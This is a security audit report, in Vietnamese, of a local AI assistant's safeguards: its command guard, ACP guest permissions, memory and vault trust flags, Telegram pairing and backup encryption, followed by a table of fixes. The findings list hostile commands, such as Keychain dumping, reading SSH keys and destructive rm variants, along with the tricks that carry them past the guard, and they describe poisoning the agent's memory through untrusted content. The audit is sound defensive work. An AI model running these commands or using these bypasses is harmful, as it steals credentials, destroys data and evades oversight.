- Chặn đúng: `rm`, `rm -rf "$HOME"`, `find -delete`, `find -exec rm`, `xargs rm`, `git clean -f`, `git reset --hard`, `git push -f`, `sudo`, `cat ~/.ssh/id_rsa`, `cat ~/.npmrc`, `ln -s ~/.ssh k`, `curl --unix-socket …/.aris/…`, công cụ `write|edit|str_replace_editor` ra ngoài cwd, `.env` (kể cả `.env.example`, `.npmrc`, `credentials*`), `channel_send`, `subagent_*`, `memory` ghi, `brain_note`, công cụ của đội.
- Lọt: `/bin/rm`, `command rm`, `\rm`, `"rm"`, `bash -c "rm …"`, `sh -c`, `eval`, `python3 -c`, `perl -e`, `node -e`, `mv x /dev/null`, `mv ~/Documents/a /tmp/`, `git -c x=y push --force`, `git push origin +main`, `git checkout -- .`, `git restore .`, `git stash drop`, `git branch -D`; ghi ngoài cwd qua shell: `echo hi > /Users/x/other/file`, `echo hi >> ~/.zshrc`, `tee /tmp/x`, `cp a ~/.zshrc`, `cp a /Users/x/Desktop/a`, `mv a ../a`, `sed -i "" … ~/.zshrc`, `curl -o ~/.zshrc …`, `dd of=/tmp/x`; đọc: `cat "$HOME"/.ssh/config`, `cd ~; cat .ssh/config`, `cat ~/.s*/config`, `cat .e*`, `git show HEAD:.env`, `grep -r KEY .`, `cat ~/Library/Logs/aris/daemon.log`, `cat ~/.zsh_history`, `read /etc/passwd`, `read ~/aris/brain/…`, `read ~/Library/Messages/chat.db`; Keychain: `security find-generic-password -w`, `/usr/bin/security dump-keychain` (riêng `guestVerdict` không có quy tắc này; `hardVerdict` chạy song song nên các ca đúng mẫu vẫn bị chặn); `aris url|stop|ask|send`; `curl http://127.0.0.1:3201/`; `launchctl bootout …`, `killall node`, `pkill -f dsh`, `kill -9 2033`; ghi qua liên kết mềm trong cwd; `cwd` không xác định thì `write /etc/hosts` cũng lọt.
- Điều "áp cả khi ứng dụng tự duyệt mọi quyền" (tiêu đề `policy.ts`) vì thế chỉ đúng với `write|edit`, `rm`, `find -delete`, `sudo`. Lệnh ghi qua shell phụ thuộc hoàn toàn vào việc ứng dụng có duyệt hay không.

Đề xuất sửa:

1. Xác thực kết nối: thêm nonce 1 lần vào `aris-acp` (đọc từ `~/.aris/acp.token` 0600, aris sinh khi bật), hoặc ít nhất ghi rõ trong màn 6.3b rằng mọi tiến trình cùng user dùng được. Kiểm `cwd`: tồn tại, là thư mục, không phải `/`, `$HOME`, `~/.aris`, `~/Library`, `~/.ssh`, thư mục `.dsh-home`; chặn cả `cwd` là cha của `$HOME`.
2. `guestVerdict`: dùng chung bộ chuẩn hoá lệnh của S2 và danh sách đường dẫn của S3. Với lệnh shell có chuyển hướng ghi (`>`, `>>`, `tee`, `cp`, `mv`, `dd of=`, `sed -i`, `curl -o`, `-O`, `ln`, `install`, `rsync`, `tar -x`, `unzip`) và đích nằm ngoài `cwd`, trả `cam('ghi ngoài thư mục được đưa')`. Nếu đích không phân tích được (biến, glob, `$()`), hỏi chứ không cho.
3. Chặn `aris`, `scripts/aris.mjs`, `launchctl`, `kill|killall|pkill` nhắm `dsh|aris|node`, `curl|wget` tới `127.0.0.1:3201` / `localhost:3201`.
4. `realpath` mọi đường dẫn ghi/đọc trước khi so với cwd.

### S12. Nhẹ. Cookie đăng nhập

Cookie `dsh-auth-<băm>`: `HttpOnly; SameSite=Strict; Path=/; Max-Age=30 ngày`, không `Secure` (HTTP trên loopback, hợp lý). Cookie không phân biệt cổng: mọi dịch vụ khác trên `127.0.0.1` (ví dụ một máy chủ dev ở cổng khác mà trình duyệt mở bằng `http://127.0.0.1:…`) nhận được cookie trong header. Cookie còn bị buộc vào `authority` (host:port) nên dùng lại cần đúng `Host`. Khuyến nghị: dùng `localhost` hay `127.0.0.1` nhất quán, không mở dịch vụ lạ trong cùng trình duyệt bằng cùng tên host; xem S4.4 về thu hồi.

### S13. Nhẹ. `~/aris` đọc được bởi người dùng khác

`~/aris/brain` (292 tệp, có `.git`), `~/aris/workspace`, `~/aris/projects`: thư mục 755, tệp 644. Thư mục nhà `~` là 750 nhóm `staff`, mà trên macOS mọi người dùng cục bộ thường thuộc `staff`. Máy chỉ một người dùng thì không sao; máy chung thì bộ não và dự án đọc được. Đề xuất: `chmod 700 ~/aris` (một lệnh), hay tạo thư mục bằng `mkdir mode 0o700` trong `ensureHome` (`@aris/home`). `.dsh-home` (0700), `~/.aris` (0700), `storages/*` (0700/0600), `.credentials.yaml` (0600), `session-search.sqlite` (0600) đều đúng. `.dsh-home/profiles/*` 755 nhưng nằm trong thư mục 0700. Socket cũ `.dsh-home/ari` (không ai nghe) nên xoá.

### S14. Nhẹ. Thiếu kiểm `content-type`

Các handler như `guard/index.ts:303`, `backup/index.ts:369`, `acp/index.ts:483` gọi `request.json()` bất kể `content-type`, nên `text/plain` (không cần preflight) được chấp nhận. Hiện không khai thác được vì dsh chặn trước (xem mục 1 ở phần 4). Đề xuất phòng thủ chiều sâu: viết một hàm `readJson(request)` dùng chung trong `@aris/home` hay `@aris/guard` đòi `application/json`, trả 415 nếu khác; thay ở mọi route POST.

### S15. Nhẹ. Keychain: mọi tiến trình cùng user đọc được

Mục tạo bằng `security add-generic-password` mặc định tin chính công cụ `security` (không `-T` riêng), nên `security find-generic-password -s aris-dsh-credentials -a <tên> -w` chạy từ bất kỳ tiến trình nào của cùng user thường không hỏi (chưa kiểm ACL thật, vì kiểm cần đụng mục khoá). Hàng rào của aris chặn bằng regex (S2: lọt qua `security -i`, `osascript do shell script`, script ngôn ngữ khác). Đề xuất: ghi nhận trong bản vẽ 6.4 rằng Keychain bảo vệ khỏi người dùng khác và khỏi tệp lọt, không bảo vệ khỏi bot cùng user; thêm `security` (mọi lệnh con) vào danh sách cấm cứng và cấm `osascript`/`python`/`node` truy cập `Security.framework` là bất khả, nên giữ ở mức "luôn hỏi".

### S16. Nhẹ. `git` trong kho bộ não

`VaultGit.run` (`git.ts:17-31`) chạy `git` với `cwd` là kho bộ não, nghe theo `.git/config` của kho (ví dụ `core.fsmonitor`, `core.sshCommand`, `core.hooksPath`). Ai ghi được `~/aris/brain/.git/config` (thao tác `write` cần duyệt ở chế độ `ask`, nhưng kho nằm ngoài danh sách cấm) sẽ làm aris tự chạy lệnh ở lượt `git status` kế tiếp. `aris-backup` còn chạy `git -C <thư mục giải nén> fsck`. Đề xuất: thêm `-c core.fsmonitor= -c core.hooksPath=/dev/null -c core.sshCommand=false -c protocol.ext.allow=never` vào mọi lệnh `git` của aris, và đưa `~/aris/brain/.git` vào danh sách ghi cấm.

### S17. Nhẹ. Chi tiết mã hoá sao lưu

- Đầu tệp lộ: `host` (tên máy thật, thử nghiệm ra `Hoang-Ba-Tau-iMac.local`), `created`, `codeId`, `salt`, `iv`, `parts[].root` (đường dẫn tuyệt đối, có tên người dùng), `entries`, số tệp và số byte.
- `codeId` là 10 hex đầu của SHA-256 nhanh, không muối, của mã khôi phục. Lộ 40 bit trong 120 bit của mã; mã còn 80 bit bí mật nên vẫn an toàn, nhưng cho phép thử mã không cần scrypt. Nên dùng HMAC với khoá riêng hay chỉ ghi nhãn ngẫu nhiên.
- scrypt `N = 2^15, r = 8, p = 1` (archive.ts:48): dưới khuyến nghị OWASP hiện nay (N = 2^17). Không nguy hiểm với mã 120 bit.
- `extractBackup` đưa dữ liệu đã giải mã thẳng vào `tar` trước khi thẻ xác thực được kiểm (thẻ kiểm ở cuối). Thẻ sai thì lỗi sau khi đã giải nén. `restore` và `drill` dùng thư mục tạm rồi xoá nên ổn; nhưng `op: extract` của API để nguyên thư mục đích do người dùng chọn khi lỗi. Nên giải vào thư mục tạm rồi `rename` sau khi thẻ hợp lệ.
- `tar -xzf - --no-same-owner` (bsdtar): mặc định từ chối `..` và đường tuyệt đối trong tên mục. Chưa thử bằng tar độc vì tạo tar độc cần dựng tệp mã hoá đúng khuôn (đã dựng tệp hợp lệ cho S8 nhưng không ghi thêm mục độc).

### S18. Nhẹ. Telegram: bảng người lạ và mã ghép

- `shouldNotifyStranger` ghi mỗi mã Telegram người lạ vào `settings.strangers` và không bao giờ xoá. Kẻ gửi nhiều tài khoản làm bảng phình. Nên bỏ mục quá 24 giờ, giới hạn 200.
- Mã ghép: 8 ký tự trong bảng 31 ký tự (khoảng 8,5 × 10^11), sống 10 phút, dùng một lần, bắt buộc nhắn riêng (không ghép trong nhóm). Không giới hạn số lần thử; với giới hạn tốc độ của Telegram thì không khai thác được. Nên thêm bộ đếm sai theo `userId` (5 lần thì khoá 1 giờ) cho gọn.

### S19. Nhẹ. Nút trả lời câu hỏi

`hub.ts:1252`: `ownerOnly = !['q'].includes(kind)`. Nút `q:` (trả lời `ask_user_question` của agent) mọi người trong nhóm bấm được, không chỉ chủ nhân. Trong nhóm được phép, thành viên có thể chọn đáp án thay chủ nhân, và nếu câu hỏi gắn với việc có tác động thì thành chọn của người không có quyền. Đề xuất: đòi `isOwner` khi lượt gốc là của chủ nhân (so `q.from.id` với người nhắn của lượt).

### S20. Nhẹ. `install` của ACP

`/api/aris/acp` `op: install` (index.ts:506-521) ghi `aris-acp` vào `/opt/homebrew/bin` (hay thư mục đầu tiên tồn tại trong danh sách) với nội dung cố định có `process.execPath` và đường dẫn `bridge.js` đặt trong dấu nháy kép, không thoát ký tự. Đường dẫn hiện tại an toàn (không có `"`, `$`, `` ` ``), nhưng đường dẫn có ký tự đặc biệt sẽ thành chèn lệnh vào script. Script trỏ vào worktree hiện tại: xoá worktree là hỏng. Ghi đè tệp có sẵn không hỏi. Chỉ chủ nhân gọi được (đã qua hàng rào dsh). Đề xuất: dùng `JSON.stringify` hay thoát bằng `'…'` đúng cách; kiểm tệp đích có phải do aris tạo (có dòng nhận diện) trước khi ghi đè.

## 4. Kết quả từng mục 1 đến 12

### Mục 1. Web và đăng nhập

- `lsof -nP -iTCP:3201 -sTCP:LISTEN`: chỉ `127.0.0.1:3201` (node pid 2033). Ổn. (Có một `next-server` ở `*:3100`, nghe mọi giao diện, không thuộc aris; xin lưu ý.)
- Token: xem S4. Cookie: xem S12.
- Hàng rào của dsh (`dsh-client-connection/lib/index.js:150-170, 697-720`): mọi `/api/*` và `/connect` đi qua `isTrustedApiRequest`: Host phải là loopback (`localhost`, `127.0.0.0/8`, `[::1]`), địa chỉ bind, hay `trustedHosts` (mặc định rỗng, aris không đặt); `Sec-Fetch-Site: cross-site` bị từ chối; nếu có `Origin` thì phải cùng quyền (authority) với `Host`; rồi mới đến cookie. Route đăng ký bằng `connection.fetch.register` còn phải là peer `owner`.
- Thử an toàn (chỉ GET, không cookie, qua curl): `GET /` → 401; `GET /api/aris/guard` → 401; có `Host: evil.example:3201` → 403; có `Sec-Fetch-Site: cross-site` → 403. Không gửi POST nào.
- CSRF lập luận: trang `https://evil.example` gửi `fetch('http://127.0.0.1:3201/api/aris/guard', {method:'POST', body:'{"op":"stop"}', headers:{'content-type':'text/plain'}, mode:'no-cors', credentials:'include'})`. Không cần preflight, nhưng: cookie `SameSite=Strict` không gửi theo yêu cầu cross-site; trình duyệt mới gửi `Sec-Fetch-Site: cross-site` nên dsh trả 403; `Origin: https://evil.example` không trùng `Host` nên dsh trả 403. Cùng kết luận cho `/api/aris/backup` (`set-dir`, `extract`) và `/api/aris/acp` (`install`). Trang ở cổng khác của `127.0.0.1` (cùng site) cũng bị `Origin` khác cổng chặn. Chỉ còn tiến trình cục bộ không phải trình duyệt, vốn đã là cùng người dùng.
- DNS rebinding: Host bị kiểm (`isLoopbackHostname` đòi đúng `localhost` hay IPv4 `127.x.x.x`/`[::1]`), nên tên miền kẻ tấn công trỏ về 127.0.0.1 nhận 403. Đã thử với `Host: evil.example:3201`. Route gốc `/` không kiểm Host nhưng đòi token mới cấp cookie.
- Mọi route aris đăng ký qua `connection.fetch.register` (22 route, 19 gói): `/api/aris/` + `memory`, `routines`, `reflect` (GET), `insights`, `projects`, `acp`, `bots`, `home` (POST), `stats` (GET), `restart` (POST), `autonomy`, `recall` (GET), `guard`, `commander`, `backup`, `media`, `providers/probe` (POST), `providers/state`, `brain`, `skills`, `checkpoints`, `channels`. Các nhánh GET đã xem đều chỉ đọc (không có GET đổi trạng thái). Phương thức khác ngoài khai báo bị dsh trả 404.
- Không có header bảo mật (`X-Frame-Options`, CSP) trên trang 401. Không cần vì không có cookie gửi vào khung cross-site.

### Mục 2. Socket và tiến trình

- Quyền: `~/.aris` 0700; `~/.aris/acp.sock` `srw-------`; `~/.aris/run/55c1532e3711.sock` `srw-------`; `ap-<pid>.sock` `srwxr-xr-x` nhưng nằm trong `~/.aris/run` (0700); `.dsh-home` 0700; `.dsh-home/ari` `srwxr-xr-x`, cũ, không ai nghe. Ổn.
- Socket daemon (`aris-daemon/src/server.ts`): HTTP qua Unix socket, mở rồi mới `chmod 0600` (cửa sổ ngắn, nhưng thư mục cha 0700 che). Lệnh `/status` (GET), `/login` (trả URL có token), `/send` (nhắn Telegram), `/ask` (giao việc cho Aris), `/stop`. Không xác thực ngoài quyền tệp. Ai có quyền tệp là cùng user. Ổn theo mô hình đe doạ, nhưng xem S4 (bot dùng `aris url`).
- Bắt tay ACP: xem S11.

### Mục 3. Quyền tệp

Đã `ls -l` và `find -perm`: `.dsh-home` 0700; `.credentials.yaml` 0600 (không mở); `storages/*` 0700; `sessions/*` 0700 (tệp `session.lock` 644 bên trong thư mục 0700); `session-search.sqlite` 0600; `logs/startup-*.log` 0600; `~/.aris` 0700 (bên trong thư mục 755 và tệp 644 nhưng cha 0700); `~/Library/Logs/aris/daemon.log` 644 trong `~/Library/Logs` (0700). Tệp sao lưu `.aris` tạo với `mode: 0o600`. `aris-keychain.json` chưa có (chưa chuyển khoá). Ngoại lệ có thể đọc được bởi người dùng khác: `~/aris/**` (S13).

### Mục 4. Khoá lọt ra ngoài

Dò `grep -rlE` (chỉ in đường tệp) các mẫu `sk-…`, `AIza…`, `xox[bp]-`, token bot Telegram, `FAL_KEY=…`, `ghp_…`, `AKIA…`, cộng mẫu chung `api_key|secret|password|token = <20+ ký tự>`, trong: `.dsh-home/{storages,logs,sessions,attachments,llm-deepseek,profiles}`, `session-search.sqlite` (nhị phân, `-a`), `~/Library/Logs/aris`, `~/.aris`, `~/aris`, `docs`, `design`, `out`, `packages`, `scripts`, toàn bộ lịch sử git (`git log --all -p | grep -c`), tham số tiến trình (`ps -axww`). Kết quả: 0 tệp, 0 dòng cho mọi mẫu khoá; đối chứng regex trên tệp giả cho 1 khớp (regex hoạt động). Duy nhất `daemon.log` có token đăng nhập web (S4). Tệp cấu hình Telegram chỉ lưu `tokenRef` (tên khoá), không lưu token. Một `node` thoáng qua (pid 94443) khớp mẫu trong tham số, không thuộc aris (tiến trình kiểm thử của phiên khác, đã tắt). Chưa kiểm được nội dung `.credentials.yaml` (luật cấm mở); không biết trong đó còn khoá nào chưa chuyển Keychain.

### Mục 5. Danh sách cấm cứng

Xem S2 và S3 (đã liệt kê từng ca bị chặn và lọt).

### Mục 6. Bộ quyền khách ACP

Xem S11.

### Mục 7. Chế độ tự cho việc rủi ro thấp

Xem S1. Ghi chú: ở `auto`, nếu bot đọc ngoài cwd là tự cho (ví dụ `cat`, `read`, `grep -r password ~`), nội dung đi vào ngữ cảnh gửi tới nhà cung cấp model.

### Mục 8. Nội dung không tin cậy vào ký ức và bộ não

- Ký ức (`aris-memory`): có cờ `trust` (`user-stated`, `agent-inferred`, `external`) và quy tắc "external không lên lõi", nhưng cờ do model khai: S5.
- Bộ não: `brain_capture` chờ duyệt (tốt); `brain_note` tự nạp: S6; tải link: S7.
- `aris-reflect`: tạo đề xuất ký ức chờ duyệt; `aris-skills`: `luu_skill` chỉ nhận trong lượt `/learn`, skill vào hộp duyệt (tốt). Skill kiểm thử trong hộp cát yếu: S10.
- `aris-routine`: `tao_routine` chỉ Commander, mặc định tắt, bật cần duyệt; chế độ `script` chạy `/bin/sh -c` không qua hàng rào nhưng chỉ tạo được từ web.
- Nội dung web qua `web_fetch` của dsh: chống SSRF tốt, nhưng nội dung trả về vẫn là dữ liệu không tin cậy trong ngữ cảnh. Không có đường để nội dung web tự gửi tin hay chạy lệnh không qua duyệt, trừ các công cụ không cần duyệt (S5, S6, `channel_send` chỉ nhắn chủ nhân).
- `/autonomy` (`/loop`, `/heartbeat`) là lệnh gạch chéo do người dùng gõ, không phải công cụ của model. Ổn.

### Mục 9. Telegram

- Ghép đôi: chủ nhân sinh mã từ web; 10 phút, một lần, chỉ nhắn riêng (S18). Người lạ nhắn riêng: im lặng, báo chủ nhân kèm 300 ký tự đầu (đã thoát HTML); nút "Cho phép hỏi đáp" chỉ chủ nhân bấm được. Hiện chỉ có một chủ nhân; `guestMode` tắt; không có mã ghép đang chờ.
- Nhóm lạ: im lặng, báo chủ nhân; nhóm được phép: chủ nhân và người được phép gọi bot.
- Lệnh `/`: thành viên chỉ `start`, `help`, `whoami`, `new`, `stop`, `status`; còn lại (`model`, `resume`, `sethome`, `voice`, `note`…) chỉ chủ nhân. Thành viên trong nhóm `/stop` được lượt của cả nhóm (chấp nhận được).
- Duyệt qua Telegram: nút `ap`, `ax`, `sx`, `bn`, `pa`, `ga`, `gl`… đều đòi `q.from.id` là chủ nhân. Ngoại lệ: nút `q` (S19). Lượt có tin của người không phải chủ nhân thì `approve` luôn từ chối (lấy mức thấp nhất trong các tin chờ). Ổn.
- Giới hạn quyền khách chỉ bằng lời dặn: S9.
- Chuyển ghi âm qua ffmpeg (`media.ts`): đầu vào từ người được phép; chưa kiểm sâu ffmpeg với tệp độc.

### Mục 10. Sao lưu

Xem S8 và S17. Thêm: `op: set-dir` chỉ nhận đường tuyệt đối, tồn tại, ghi được, không nằm trong dữ liệu được sao lưu (`checkDir`); tệp ghi ra chỉ tên khớp `aris-YYYY-MM-DD-HHMM.aris`, và việc xoá bản cũ chỉ xoá tệp khớp tên và đọc được đầu tệp, nên không xoá được tệp lạ. `op: extract` mở hộp chọn thư mục của macOS (người dùng chọn đích), tên bản phải có trong danh sách. `op: drill` giải vào `mkdtemp(tmpdir())` rồi xoá. Sao lưu không chứa `.credentials.yaml` hay khoá Keychain (đã kiểm `partSpecs`); gồm `sessions`, `storages`, `attachments`, `~/aris/workspace`, `~/aris/projects`, nên có thể chứa `.env` của dự án người dùng (được mã hoá).

### Mục 11. Keychain

Ghi qua `security -i` với `-X <hex>` trên stdin (không có giá trị trong `argv`; xác nhận bằng mã và `ps`: không tiến trình nào chứa mẫu khoá). Đọc dùng `find-generic-password -w` đọc stdout. Tên khoá được kiểm bằng `^[A-Za-z0-9_.:@-]{1,128}$`, không có khoảng trắng nên không chèn được dòng lệnh vào `security -i`. Đường khác để bot đọc Keychain: S15.

### Mục 12. Bề mặt khác

- `execFile`/`spawn` trong `packages/*/src` (đã grep): `security` (đối số cố định), `tar`, `sqlite3`, `osascript` (chuỗi cố định, tiêu đề dùng `JSON.stringify`), `git` (đối số mảng, không `shell: true`), `open` (mảng), `textutil`, `ffmpeg`/`say`, `claude`/`codex` (đường dẫn tìm được, đối số mảng), `ps -p <số>`. Không có `shell: true` và không có `exec(` chuỗi. Duy nhất `aris-routine/src/script.ts:23` chạy `/bin/sh -c <lệnh>`: lệnh là của routine chế độ `script`, tạo từ web bởi chủ nhân. Bot không tạo được routine `script`.
- Chèn lệnh: tên tệp trong sao lưu đi vào `tar -T -` có `--null` (an toàn); đường dẫn vào `.backup '<đường>'` của `sqlite3` được nhân đôi nháy đơn. Chưa thử tên tệp lạ (xuống dòng) với `sqlite3 .backup`.
- Đọc tệp theo tham số: `?page=` của bộ não (`inVault` dùng `relative` + loại `..`; tuyệt đối bị cắt `/` đầu; chỉ phục vụ trang có trong danh mục). Qua liên kết mềm trong kho có thể lộ, cần ghi vào kho trước (S16). `/api/aris/media?file=` kiểm `^m-[a-f0-9-]{6,20}$` và tra bảng, không nhận đường dẫn. Không thấy path traversal.
- ACP `install`: S20.
- Gửi dữ liệu ra ngoài: `fetchPage` (S7). `web_fetch`/`web_search` của dsh: tốt.
- Bot ngoài (Claude Code, Codex) chạy ngoài hàng rào của aris (đã ghi trong `guestVerdict`); cấu hình hiện có là `manual` và `ask`. Chế độ `bypassPermissions`/`dangerously-bypass-approvals-and-sandbox` có trong mã (`claude-driver.ts:104-108`, `codex-driver.ts:24`); chỉ đặt được từ cấu hình bot (cần web). Nên cân nhắc ẩn các chế độ đó hay cảnh báo to.

## 5. Những gì chưa kiểm và lý do

- `pnpm audit`, độ mới của phụ thuộc, giấy phép: cần mạng. Chưa kiểm phụ thuộc. Có thể chạy `pnpm audit` ở bước sau khi được phép.
- Nội dung `.dsh-home/.credentials.yaml`: luật cấm mở. Không biết còn khoá nào chưa chuyển Keychain (có thể xem qua màn Cài đặt › Ngân sách, duyệt, an toàn).
- ACL thật của các mục Keychain `aris-dsh-credentials`: kiểm cần đọc hay đụng mục khoá. S15 là suy luận từ cách tạo mục.
- Hành vi dsh khi đóng: công cụ nào của dsh tự `ask` (xác định công cụ nào không cần duyệt thật). Đã đọc `dsh-tools` (kết quả mặc định của `tools/pre-execute` là `allow`) và mã aris, nhưng chưa chạy phiên thật để đếm. Cần Opus kiểm S5, S6, S9 bằng phiên thật.
- Gọi công cụ lồng trong PTC/`run_code` của dsh có đi qua `tools/pre-execute` của aris-guard hay không: chưa kiểm. Nếu không, hàng rào bị bỏ qua hoàn toàn.
- Tên tham số thật của `terminal_send`/`terminal_open`: hàm đọc `command|input|text`; chưa đối chiếu với mã dsh.
- CSRF: chỉ lập luận từ mã và 4 yêu cầu GET an toàn; không gửi POST tới daemon thật, không dùng trình duyệt (theo luật). Hành vi của Safari/Firefox với `Sec-Fetch-Site` và `SameSite` không thử.
- Chưa tạo tar độc (đường dẫn `../`, tuyệt đối, liên kết mềm) để thử `bsdtar` bên trong `extractBackup`; chỉ dựa vào mặc định đã biết của bsdtar. S8 đã được thử bằng chỉnh đầu tệp thật.
- ffmpeg với tệp ghi âm độc; `sqlite3 .backup` với tên tệp lạ; `textutil` với HTML độc: không thử.
- Mã giao diện (`aris-ui-*`): chưa rà XSS (hiển thị Markdown của bộ não, nội dung tin của bot). Nên rà riêng, vì nội dung từ web và Telegram đi vào đó.
- Đồng bộ `aris restore` trên máy thật: chưa chạy (cấm).

## 6. Đã sửa (đợt 7f)

Người sửa: Sonnet 5.5, theo `docs/plans/gd7-7f-sua-bao-mat.md`. Phần lệnh shell dùng chung nằm ở gói mới `@aris/shell` (`packages/aris-shell`: chuẩn hoá lệnh, đường cấm, lệnh chỉ đọc, nhận diện phiên không tin cậy); `@aris/guard`, `@aris/acp`, `@aris/skills`, `@aris/memory`, `@aris/brain`, `@aris/channels` dùng gói đó. Trạng thái: đã sửa, một phần, để sau, hay chấp nhận.

| Mã | Trạng thái | Ghi chú |
| --- | --- | --- |
| S1 | Đã sửa | `lowRisk` dựa trên `readOnlyCommand` (chế độ chặt): tách cả `&` đơn và xuống dòng, không `$`, dấu huyền, `<(`, `>(`, heredoc, gán biến đầu lệnh; bỏ `echo`; `find` không `-delete -exec* -ok* -fprint* -fls`; `git diff\|log\|show` không `--output`; `git branch` và `git remote` chỉ dạng liệt kê; `rg` không `--pre`; `sort` không `-o`; `date` không đặt giờ. Đọc (lệnh và công cụ `read`, `grep`, `glob`) chỉ tự cho khi nằm trong cwd sau khi giải liên kết mềm và không phải đường cấm. Ghi trong cwd không tự cho `.git/`, `.envrc`, `.env*`, `.vscode/`, `.idea/`, `package.json`, `Makefile`, `.husky/`, `.github/workflows/`, chỗ tự chạy. |
| S2 | Đã sửa (chặn "hay gặp") | Lệnh được chuẩn hoá trước khi soi: bỏ nháy và `\`, `$HOME`, `${HOME}`, `~user`, `$PWD`, biến đã gán trong lệnh; bóc `command`, `builtin`, `exec`, `env`, `nice`, `nohup`, `time`, `timeout`, `xargs`; `bash\|sh\|zsh -c`, `eval`, heredoc vào shell được đọc đệ quy; tách theo `; && \|\| \| & \n ( ) $() ` ` `; theo dõi `cd` (không rõ thì coi là ngoài). Chặn thêm: `rm -rf .*`, đích có biến hay lệnh con, `xargs rm -r`, `find -delete\|-exec rm` gốc ngoài cwd, `git push` có `+ref` hay `-c`/`-C`, `doas`, `su`, `pkexec`, `security -i` và các lệnh con đọc khoá, script `python\|perl\|ruby\|node -e` gọi xoá kèm đường ngoài cwd. Không thể chặn tuyệt đối (script dài, ghép tên lệnh từ biến, `printf … \| sh`). |
| S3 | Đã sửa | Danh sách cấm thêm `.npmrc`, `.git-credentials`, `.docker/config.json`, `.kube`, `.zsh_history`, `.bash_history`, `Library/Logs/aris`, dữ liệu Chrome, Firefox, Arc, Brave, `Library/Cookies`, `Library/Safari` (đọc và ghi, không phân biệt hoa thường). Chỉ cấm ghi: `.zshrc`, `.zprofile`, `.zshenv`, `.bashrc`, `.bash_profile`, `.profile`, `.config/fish`, `LaunchAgents`, `LaunchDaemons`, `.git/hooks`. Bắt `cd ~; cat .ssh/x`, glob (`~/.s*/`, `.e*`), `git show rev:.env`, đường qua liên kết mềm (`realpath`) và mẫu của `glob`/`grep`. Chặn `aris url\|open`, `scripts/aris.mjs url\|open`, `pnpm aris:cli url\|open`. |
| S4 | Đã sửa | `printUrl: false` cho row `web-runtime` trong `packages/aris-web-bundle/cordis.patch.yml` (kiểm bằng `--dump-config` trên profile tạm). Sau khi khởi động lại không còn dòng `dsh web:` mới. `aris url\|open` lấy URL qua socket `/login`, không từ log. Log cũ vẫn còn các dòng token của tiến trình đã chết (daemon.log không xoay vòng): người dùng tự cắt log nếu muốn. Cookie không thu hồi được: S12, chờ dsh. |
| S5 | Đã sửa một phần | Trong phiên không tin cậy (routine, Thủ thư, kiểm thử skill, phiên con, `via` là `team`/`dispatch`, khách ACP, lượt Telegram của người không phải chủ) `save` với `origin: user` bị hạ thành đề xuất chờ duyệt; `update` và `forget` bị từ chối hẳn (kho đề xuất chưa có kiểu sửa/quên). Chưa làm: model trong chat trực tiếp vẫn tự khai được `origin=user` sau khi đọc nguồn ngoài (cần cờ "lượt đã đọc nguồn ngoài", ngoài plan này). |
| S6 | Đã sửa | Mỗi mục `brain_note` ghi dòng nguồn (bot, phiên, loại phiên, tin cậy hay không); chữ bot không dựng được tiêu đề giả. Mục của phiên không tin cậy mang `nguon: khong-tin-cay`, không vào bản tự nạp 23:00 (`sourceTextOf`, `diaryTick`), thành một bản nạp riêng "Ghi nhanh chưa rõ nguồn" (`from: bot`) luôn chờ người dùng duyệt. |
| S7 | Đã sửa | `safeUrl` dùng `isPublicIp` (IPv4 loopback, riêng, link-local, CGNAT, 0/8, multicast; IPv6 `::`, `::1`, `fc00::/7`, `fe80::/10`, multicast, IPv4 nhúng `::ffff:x`, `64:ff9b::x`, `2002:`), chặn `localhost`, `*.local`, `*.internal`, `*.lan`. `fetchPage` phân giải DNS (mọi địa chỉ phải công khai), `redirect: manual`, tối đa 5 bước, kiểm lại từng chặng. Còn: fetch phân giải DNS lần nữa nên DNS rebinding trong một khoảng ngắn chưa ghim. |
| S8 | Đã sửa | Đầu tệp thành AAD của GCM, `v` lên 2, từ chối `v: 1` với lời báo rõ. `extractBackup` và `restoreBackup` chỉ nhận `id` trong `dsh, brain, workspace, projects, aris` và tên mục là tên đơn; `restoreBackup` chỉ dùng gốc từ `roots`, phần thiếu gốc vào `skipped` (lệnh `aris restore` in cảnh báo); liên kết mềm trỏ ra ngoài thư mục giải nén bị xoá và báo lỗi. Không truyền `-P` cho bsdtar. Bản sao lưu thật có liên kết mềm tuyệt đối trỏ ra ngoài sẽ không giải nén được. |
| S9 | Đã sửa | `hub.restricted(sessionId)` đúng suốt lượt có tin của người không phải chủ. `@aris/guard` (`tools/pre-execute`) chỉ cho `read`, `grep`, `glob`, `brain_search`, `brain_read`, `web_search`, `web_fetch`, `memory` (`search`/`list`) trong lượt đó (`RESTRICTED_TOOLS`); công cụ khác bị từ chối. |
| S10 | Đã sửa | `readOnlyBash` của `@aris/skills` gọi `readOnlyCommand` (chế độ nới: cho `cd`, gán biến, `echo`, đọc ngoài cwd, `xargs` và `find -exec` chạy tiếp lệnh đọc). Bỏ `awk`, `sed` (trừ `sed -n 'Np'`), `git branch\|remote\|tag`; chặn `&`, xuống dòng, `<(`, `sort -o`, `rg --pre`… Cũng siết `@aris/checkpoints` và `@aris/routine` vì dùng chung hàm. |
| S11 | Đã sửa một phần | Từ chối bắt tay khi `cwd` là `/`, thư mục nhà hay cha của nó, `~/Library`, cây hệ thống, chứa `.aris`/`.dsh-home`/đường cấm, không tồn tại. `guestVerdict` dùng bộ chuẩn hoá: chặn ghi ngoài thư mục được đưa qua `>`, `>>`, `tee`, `cp`, `mv`, `ln`, `sed -i`, `curl -o`, `wget -O`, `rsync`, `install`, `dd of=`; chặn `launchctl`, `kill`, `killall`, `pkill`, `osascript`, `open`, `security`, `aris`; công cụ ghi/đọc tệp giải liên kết mềm. Chưa làm: xác thực kết nối bằng nonce; `cwd` khai trong `session/new` (ngoài `hello`). |
| S12 | Để sau | Cookie dùng chung mọi cổng, không thu hồi: chờ bản dsh sau. |
| S13 | Để sau | Quyền `~/aris`: đổi quyền tệp người dùng, để người dùng quyết. |
| S14 | Để sau | Chưa ép `content-type: application/json` (không khai thác được vì dsh chặn trước). |
| S15 | Để sau | ACL Keychain. |
| S16 | Để sau | `git` trong kho bộ não nghe `.git/config`. |
| S17 | Một phần | AAD chống sửa đầu tệp (xem S8). Còn lộ tên máy và đường dẫn trong đầu tệp, `codeId` không muối, scrypt N=2^15: để sau/chấp nhận. |
| S18 | Đã sửa | Sai mã ghép đôi 5 lần trong một giờ thì khoá chat tới hết giờ (kể cả gõ đúng); bảng `strangers` dọn bản ghi quá 30 ngày. |
| S19 | Đã sửa | Mọi nút Telegram, kể cả `q:`, chỉ người dùng chính bấm được. |
